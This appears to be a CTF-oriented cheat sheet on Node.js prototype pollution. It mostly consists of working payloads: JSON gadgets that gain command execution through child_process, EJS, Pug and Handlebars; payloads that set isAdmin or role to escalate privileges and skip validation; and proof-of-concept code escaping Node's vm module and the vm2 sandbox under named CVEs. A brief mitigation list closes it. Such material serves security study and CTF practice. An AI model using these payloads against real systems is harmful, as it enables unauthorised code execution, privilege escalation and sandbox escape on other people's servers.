# Prototype Pollution (Node.js)

## Concept

JavaScript objects inherit properties from their prototype chain.
If an attacker can set properties on `Object.prototype`, every
object in the application inherits those properties.

## Detection

```json
// In JSON body, query parameters, or merge operations:
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"polluted": true}}}

// Check if pollution worked:
// In server code: console.log({}.polluted)  → true
```

## Injection Points

| Mechanism | Example |
|---|---|
| Recursive merge/assign | `merge(target, user_input)` |
| Path-based set | `lodash.set(obj, path, value)` |
| JSON.parse + merge | Parse then deep-merge user JSON |
| Query string parser | `qs` library with depth |
| `Object.assign` + spread | Only shallow — not directly vulnerable |

### Vulnerable Libraries

- `lodash.merge` / `lodash.set` / `lodash.defaultsDeep`
- `flatnest` (CVE-2023-26135)
- `merge-deep`, `defaults-deep`, `deep-extend`
- Custom recursive merge functions without `__proto__` check

## RCE via Prototype Pollution

### child_process.spawn / exec Options

If server calls `child_process.spawn()` or `child_process.exec()`:

```json
{"__proto__": {
    "shell": "/proc/self/exe",
    "argv0": "console.log(require('child_process').execSync('id').toString())//"
}}
```

### EJS Template Engine

```json
// If EJS is used for rendering:
{"__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"
}}
```

### Pug (Jade) Template Engine

```json
{"__proto__": {
    "block": {
        "type": "Text",
        "val": "x]});process.mainModule.require('child_process').execSync('id');//"
    }
}}
```

### Handlebars Template Engine

```json
{"__proto__": {
    "type": "Program",
    "body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "SubExpression",
            "path": 0,
            "params": [{"type": "StringLiteral", "value": "id"}]
        }]
    }]
}}
```

## Non-RCE Exploitation

### Privilege Escalation

```json
// If authorization checks: if (user.isAdmin) ...
{"__proto__": {"isAdmin": true}}

// If role-based: if (user.role === 'admin') ...
{"__proto__": {"role": "admin"}}
```

### Bypassing Security Checks

```json
// Skip input validation
{"__proto__": {"verified": true, "approved": true}}

// Bypass rate limiting
{"__proto__": {"rateLimit": 999999}}
```

### DoS via Type Confusion

```json
// toString or valueOf override
{"__proto__": {"toString": "not a function"}}
// Causes TypeError when any object is stringified
```

## VM Sandbox Escape

**When**: Node.js `vm` module is used for sandboxing.

```javascript
// Basic VM escape
const vm = require('vm');
const sandbox = {};
vm.runInNewContext('this.constructor.constructor("return process")().exit()', sandbox);

// Via prototype pollution in sandbox:
// Pollute Object.prototype before sandbox creation
// Properties leak into the sandbox's global scope
```

### happy-dom / jsdom Gadgets

In testing environments using happy-dom or jsdom, prototype
pollution can reach browser-API emulation code that calls
`require()` or accesses the filesystem.

## vm2 Sandbox Escape (CVE-2023-29017 and descendants)
**When**: Challenge uses `vm2` npm package for sandboxing JS code. | vm2 has had repeated critical sandbox escapes (2022-2026).

### Error.prepareStackTrace (CVE-2023-29017)
```javascript
// vm2 <= 3.9.14
const {VM} = require("vm2");
const vm = new VM();
const code = `
  async function fn() {
    (function stack() {
      new Error().stack;
      stack();
    })();
  }
  p = fn();
  p.constructor = {
    [Symbol.species]: class FakePromise {
      constructor(executor) {
        executor(
          (x) => x,
          (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('id'); }
        );
      }
    }
  };
  p.then();
`;
console.log(vm.run(code));
```

### Proxy-based (CVE-2023-37466)
```javascript
// vm2 <= 3.9.19
const code = `
  const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
  obj = {
    [customInspectSymbol]: (depth, opt, inspect) => {
      inspect.constructor('return process')().mainModule.require('child_process').execSync('id');
    },
    valueOf: undefined,
    constructor: undefined,
  };
  WebAssembly.compileStreaming(obj).catch(()=>{});
`;
```

**Trap**: vm2 was discontinued in 2023 then revived in 2025. Check the exact version — each CVE has a specific bypass. Use `isolated-vm` instead of vm2 for secure sandboxing.

## Mitigation Awareness

CTF challenges may use partial mitigations:
- `Object.create(null)` for config objects (no prototype)
- `Object.freeze(Object.prototype)` (prevents modification)
- Filtering `__proto__` key (bypass with `constructor.prototype`)
- Using `Map` instead of plain objects

## Tools

```bash
# Server-side prototype pollution scanner
ppmap                                  # automated detection
```
